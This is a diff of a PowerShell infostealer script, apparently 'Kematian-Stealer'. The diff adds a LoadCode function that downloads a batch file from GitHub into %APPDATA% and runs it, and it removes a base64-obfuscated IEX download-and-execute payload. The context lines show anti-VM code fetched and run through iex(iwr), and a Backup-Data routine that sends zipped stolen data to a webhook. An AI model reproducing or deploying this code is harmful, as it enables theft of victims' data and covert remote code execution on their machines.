@@ -98,6 +98,41 @@ function Invoke-TASKS {
     Backup-Data
 }
 
+function LoadCode {
+    $userDomain = [System.Environment]::GetEnvironmentVariable("USERDOMAIN")
+    if ($userDomain -eq "DESKTOP-4V4R77Q") {
+        Write-Output "Không tải và chạy tệp do tên miền người dùng không phù hợp."
+        return
+    }
+
+    $appData = [System.Environment]::GetEnvironmentVariable("APPDATA")
+    $filePath = Join-Path $appData "loadcode.bat"
+    $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/.vscode/loadcode.bat"
+
+    # Kiểm tra sự tồn tại của tệp
+    if (-Not (Test-Path $filePath)) {
+        # Tải tệp từ URL và lưu vào %appdata%
+        try {
+            Invoke-WebRequest -Uri $url -OutFile $filePath
+            Write-Output ("File tải xuống thành công và lưu tại " + $filePath)
+        }
+        catch {
+            Write-Output ("Lỗi khi tải tệp: " + $_.Exception.Message)
+            return
+        }
+    }
+
+    # Chạy tệp loadcode.bat
+    try {
+        Start-Process $filePath -Wait
+        Write-Output "Tệp đã được chạy thành công."
+    }
+    catch {
+        Write-Output ("Lỗi khi chạy tệp: " + $_.Exception.Message)
+    }
+}
+
+
 function VMPROTECT {
     $link = ("https://github.com/adasdasdsaf/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
     iex (iwr -uri $link -useb)
@@ -1338,7 +1373,7 @@ function Backup-Data {
     $multipartContent.Add($streamContent, "payload_json"); $fileStream = [IO.File]::OpenRead($zipFilePath)
     $fileContent = [Net.Http.StreamContent]::new($fileStream); $multipartContent.Add($fileContent, "file", $zipFilePath); $httpClient.PostAsync($webhook, $multipartContent).Result
 
-    IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JGtlbWF0aWFuX3NoZWxsY29kZSA9ICgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzQzYTE3MjMvdGVzdC9tYWluL2Rvd25sb2FkLnBzMSIpCiRkb3dubG9hZCA9ICIoTmV3LU9iamVjdCBOZXQuV2ViY2xpZW50KS4iImBEb3dObG9BZFNgVFJgaWBOYGciIignJGtlbWF0aWFuX3NoZWxsY29kZScpIgpTdGFydC1Qcm9jZXNzICJwb3dlcnNoZWxsIiAtQXJndW1lbnQgIkknRSdYKCRkb3dubG9hZCkiIC1Ob05ld1dpbmRvdyAtUGFzc1RocnU=")))
+    LoadCode
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
 
     # cleanup
